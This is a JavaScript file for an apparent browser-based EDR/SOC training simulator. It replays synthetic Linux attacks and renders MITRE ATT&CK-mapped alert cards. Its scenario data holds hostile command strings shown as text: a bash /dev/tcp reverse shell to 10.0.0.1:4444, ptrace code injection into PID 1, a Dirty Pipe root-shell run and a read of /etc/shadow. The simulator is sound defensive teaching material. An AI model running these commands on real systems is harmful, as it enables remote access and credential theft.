/**
 * eBPF Linux EDR Sensor - Interactive SOC Simulator Engine
 * 
 * Simulates real-time kernel syscall interception, binary C-struct decoding,
 * YAML rule evaluation, and MITRE ATT&CK alert enrichment in the browser.
 */

// State Management
let telemetryCount = 0;
let detectionCount = 0;
let alertsHistory = [];
let currentFilter = 'ALL';

// Attack Scenarios & Synthetic Telemetry Payloads
const ATTACK_SCENARIOS = {
  reverse_shell: {
    title: 'Interactive Reverse Shell Execution',
    ruleId: 'RULE-EDR-001',
    severity: 'CRITICAL',
    mitre: {
      tacticId: 'TA0002',
      tacticName: 'Execution',
      techniqueId: 'T1059.004',
      techniqueName: 'Command and Scripting Interpreter: Unix Shell',
      url: 'https://attack.mitre.org/techniques/T1059/004/'
    },
    commands: [
      { text: '$ nc -l -p 4444 &', delay: 100 },
      { text: '$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', delay: 300, isAdversary: true },
      { text: '[+] Outbound TCP socket established: 10.0.0.5:54321 -> 10.0.0.1:4444', delay: 500 }
    ],
    syscall: 'sys_enter_execve',
    bpfTelemetry: {
      timestamp_ns: 1700000000123456789,
      timestamp_utc: new Date().toISOString(),
      event_type: 'EXECVE',
      pid: 1337,
      tgid: 1337,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'bash',
      filename: '/bin/bash',
      args: '-i >& /dev/tcp/10.0.0.1/4444 0>&1',
      cmdline: '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      retval: 0
    },
    description: 'Detects interactive shell execution with socket redirects or reverse shell command patterns.'
  },

  process_injection: {
    title: 'Process Memory Injection & PTRACE Abuse',
    ruleId: 'RULE-EDR-002',
    severity: 'CRITICAL',
    mitre: {
      tacticId: 'TA0005',
      tacticName: 'Defense Evasion',
      techniqueId: 'T1055.008',
      techniqueName: 'Process Injection: Ptrace System Calls',
      url: 'https://attack.mitre.org/techniques/T1055/008/'
    },
    commands: [
      { text: '$ ./trigger_ptrace', delay: 100 },
      { text: '[*] [Parent PID: 2048] Invoking ptrace(PTRACE_ATTACH, pid=1)...', delay: 250, isAdversary: true },
      { text: '[+] Target attached. Invoking ptrace(PTRACE_POKETEXT, addr=0x400000, data=0x90909090)...', delay: 450, isAdversary: true }
    ],
    syscall: 'sys_enter_ptrace',
    bpfTelemetry: {
      timestamp_ns: 1700000001000000000,
      timestamp_utc: new Date().toISOString(),
      event_type: 'PTRACE',
      pid: 2048,
      tgid: 2048,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'injector',
      ptrace_request: 'PTRACE_POKETEXT',
      ptrace_request_code: 4,
      target_pid: 1,
      addr: '0x0000000000400000',
      data: '0x0000000090909090'
    },
    description: 'Detects unauthorized ptrace system calls used for code injection or process tampering.'
  },

  privilege_escalation: {
    title: 'Unexpected Root Privilege Escalation',
    ruleId: 'RULE-EDR-003',
    severity: 'HIGH',
    mitre: {
      tacticId: 'TA0004',
      tacticName: 'Privilege Escalation',
      techniqueId: 'T1068',
      techniqueName: 'Exploitation for Privilege Escalation',
      url: 'https://attack.mitre.org/techniques/T1068/'
    },
    commands: [
      { text: '$ ./dirty_pipe_exploit', delay: 100 },
      { text: '[*] Overwriting page cache credentials...', delay: 300, isAdversary: true },
      { text: '[+] Spawning root shell with UID 0: # /bin/sh', delay: 500, isAdversary: true }
    ],
    syscall: 'sys_enter_execve',
    bpfTelemetry: {
      timestamp_ns: 1700000002000000000,
      timestamp_utc: new Date().toISOString(),
      event_type: 'EXECVE',
      pid: 31337,
      tgid: 31337,
      ppid: 1005,
      uid: 0,
      gid: 0,
      comm: 'sh',
      filename: '/bin/sh',
      args: '',
      cmdline: '/bin/sh',
      retval: 0
    },
    description: 'Detects execution of root shell or privileged commands spawned under suspicious parent context.'
  },

  sensitive_file: {
    title: 'Sensitive Credential File Access',
    ruleId: 'RULE-EDR-004',
    severity: 'HIGH',
    mitre: {
      tacticId: 'TA0006',
      tacticName: 'Credential Access',
      techniqueId: 'T1003.008',
      techniqueName: 'OS Credential Dumping: /etc/passwd and /etc/shadow',
      url: 'https://attack.mitre.org/techniques/T1003/008/'
    },
    commands: [
      { text: '$ cat /etc/shadow', delay: 150, isAdversary: true },
      { text: 'root:$6$rounds=4096$vF8u...:19200:0:99999:7:::', delay: 350 },
      { text: 'daemon:*:19200:0:99999:7:::', delay: 450 }
    ],
    syscall: 'sys_enter_openat',
    bpfTelemetry: {
      timestamp_ns: 1700000003000000000,
      timestamp_utc: new Date().toISOString(),
      event_type: 'OPENAT',
      pid: 4096,
      tgid: 4096,
      ppid: 1000,
      uid: 1000,
      gid: 1000,
      comm: 'cat',
      filepath: '/etc/shadow',
      file_path: '/etc/shadow',
      flags: 0,
      flags_desc: 'O_RDONLY',
      dfd: -100,
      retval: 0
    },
    description: 'Detects unauthorized read/write access to sensitive credential stores or SSH keys.'
  }
};

/**
 * Trigger an attack simulation by scenario key
 */
function triggerAttack(scenarioKey) {
  const scenario = ATTACK_SCENARIOS[scenarioKey];
  if (!scenario) return;

  const term = document.getElementById('terminal-content');
  const badge = document.getElementById('telemetry-badge');
  const rawJson = document.getElementById('raw-bpf-json');

  // 1. Play Terminal Execution Commands
  scenario.commands.forEach(cmd => {
    setTimeout(() => {
      const line = document.createElement('div');
      if (cmd.isAdversary) {
        line.className = 'text-rose-400 font-semibold';
      } else {
        line.className = 'text-slate-300';
      }
      line.textContent = cmd.text;
      term.appendChild(line);
      term.scrollTop = term.scrollHeight;
    }, cmd.delay);
  });

  // 2. Animate Kernel Tracepoint Interception
  setTimeout(() => {
    badge.textContent = `INTERCEPTED: ${scenario.syscall}`;
    badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/20 text-rose-400 border border-rose-500/40 font-bold';

    // Update telemetry JSON
    scenario.bpfTelemetry.timestamp_utc = new Date().toISOString();
    rawJson.textContent = JSON.stringify(scenario.bpfTelemetry, null, 2);

    // Increment telemetry count
    telemetryCount += 1;
    document.getElementById('metric-telemetry-count').textContent = telemetryCount;

    // Reset badge state after a short delay
    setTimeout(() => {
      badge.textContent = 'PROBE LISTENING';
      badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400 border border-cyan-500/20';
    }, 1200);

    // 3. Generate EDR Alert
    createAlert(scenario);

  }, 650);
}

/**
 * Creates and renders a new EDR detection alert card
 */
function createAlert(scenario) {
  detectionCount += 1;
  document.getElementById('metric-detection-count').textContent = detectionCount;
  document.getElementById('alert-badge-count').textContent = detectionCount;

  // Hide empty state if present
  const emptyState = document.getElementById('empty-alert-state');
  if (emptyState) {
    emptyState.style.display = 'none';
  }

  const alertObj = {
    id: `alert-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`,
    ruleId: scenario.ruleId,
    title: scenario.title,
    severity: scenario.severity,
    mitre: scenario.mitre,
    description: scenario.description,
    event: scenario.bpfTelemetry,
    timestamp: new Date().toLocaleTimeString()
  };

  alertsHistory.unshift(alertObj);
  renderAlerts();
}

/**
 * Render all alert cards based on active filter
 */
function renderAlerts() {
  const container = document.getElementById('alerts-container');
  const filtered = alertsHistory.filter(a => {
    if (currentFilter === 'ALL') return true;
    return a.severity === currentFilter;
  });

  // Clear previous cards except empty state
  const cards = container.querySelectorAll('.alert-card');
  cards.forEach(c => c.remove());

  if (filtered.length === 0) {
    const emptyState = document.getElementById('empty-alert-state');
    if (emptyState) emptyState.style.display = 'flex';
    return;
  }

  const emptyState = document.getElementById('empty-alert-state');
  if (emptyState) emptyState.style.display = 'none';

  filtered.forEach((a, idx) => {
    const isCritical = a.severity === 'CRITICAL';
    const borderCol = isCritical ? 'border-rose-500/40 hover:border-rose-500' : 'border-amber-500/40 hover:border-amber-500';
    const sevBadgeCol = isCritical ? 'bg-rose-500/15 text-rose-400 border-rose-500/30' : 'bg-amber-500/15 text-amber-400 border-amber-500/30';
    const isNewClass = idx === 0 ? 'alert-new' : '';

    const card = document.createElement('div');
    card.className = `alert-card p-4 rounded-xl bg-cyber-850 border ${borderCol} transition-all duration-200 shadow-md ${isNewClass}`;

    let detailContent = '';
    if (a.event.event_type === 'EXECVE') {
      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1 truncate"><span class="text-slate-500">cmd:</span> ${escapeHtml(a.event.cmdline)}</div>`;
    } else if (a.event.event_type === 'PTRACE') {
      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1"><span class="text-slate-500">req:</span> ${a.event.ptrace_request} &bull; <span class="text-slate-500">target_pid:</span> ${a.event.target_pid}</div>`;
    } else if (a.event.event_type === 'OPENAT') {
      detailContent = `<div class="text-slate-300 font-mono text-xs mt-1 truncate"><span class="text-slate-500">file:</span> ${a.event.file_path} [${a.event.flags_desc}]</div>`;
    }

    card.innerHTML = `
      <div class="flex items-center justify-between">
        <div class="flex items-center space-x-2">
          <span class="text-xs font-mono font-bold px-2 py-0.5 rounded border ${sevBadgeCol}">${a.severity}</span>
          <span class="text-xs font-mono text-slate-400 font-semibold">${a.ruleId}</span>
        </div>
        <span class="text-xs font-mono text-slate-500">${a.timestamp}</span>
      </div>

      <h4 class="font-bold text-white text-sm mt-2">${escapeHtml(a.title)}</h4>
      <p class="text-xs text-slate-400 mt-0.5">${escapeHtml(a.description)}</p>

      <!-- Telemetry snippet -->
      <div class="mt-2.5 p-2 rounded-lg bg-cyber-950/80 border border-cyber-border/70">
        <div class="flex items-center justify-between text-[11px] font-mono text-slate-400">
          <span>comm: <strong class="text-cyan-400">${a.event.comm}</strong> (pid: ${a.event.pid})</span>
          <span>uid: <strong class="${a.event.uid === 0 ? 'text-rose-400' : 'text-slate-300'}">${a.event.uid}</strong></span>
          <span>ppid: ${a.event.ppid}</span>
        </div>
        ${detailContent}
      </div>

      <!-- MITRE ATT&CK Footer -->
      <div class="mt-3 pt-2.5 border-t border-cyber-border/60 flex items-center justify-between text-xs">
        <div class="flex items-center space-x-1.5">
          <span class="w-2 h-2 rounded-full bg-purple-400"></span>
          <span class="text-slate-400 font-mono">${a.mitre.techniqueId}</span>
          <span class="text-slate-500">&bull;</span>
          <span class="text-slate-300">${a.mitre.techniqueName}</span>
        </div>
        <a href="${a.mitre.url}" target="_blank" rel="noopener" class="text-cyan-400 hover:text-cyan-300 flex items-center space-x-1 text-[11px]">
          <span>MITRE Matrix</span>
          <i data-lucide="external-link" class="w-3 h-3"></i>
        </a>
      </div>
    `;

    container.appendChild(card);
  });

  // Reinitialize Lucide icons on newly created elements
  if (window.lucide) {
    lucide.createIcons();
  }
}

/**
 * Filter alerts by severity
 */
function filterAlerts(sev) {
  currentFilter = sev;
  document.querySelectorAll('.alert-filter-btn').forEach(btn => {
    if (btn.textContent.toUpperCase() === sev) {
      btn.className = 'alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-700 text-white font-medium';
    } else {
      btn.className = 'alert-filter-btn px-2.5 py-1 rounded-md bg-cyber-800 text-slate-300 hover:text-white';
    }
  });
  renderAlerts();
}

/**
 * Clear alert history
 */
document.getElementById('btn-clear-alerts').addEventListener('click', () => {
  alertsHistory = [];
  detectionCount = 0;
  document.getElementById('metric-detection-count').textContent = 0;
  document.getElementById('alert-badge-count').textContent = 0;
  
  const term = document.getElementById('terminal-content');
  term.innerHTML = '<div class="text-slate-500"># History cleared. Terminal ready for next attack simulation...</div>';
  
  const rawJson = document.getElementById('raw-bpf-json');
  rawJson.textContent = '{\n  "status": "eBPF tracepoints active",\n  "waiting_for_syscall": true\n}';
  
  renderAlerts();
});

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// Initial icon bootstrap
document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    lucide.createIcons();
  }
});
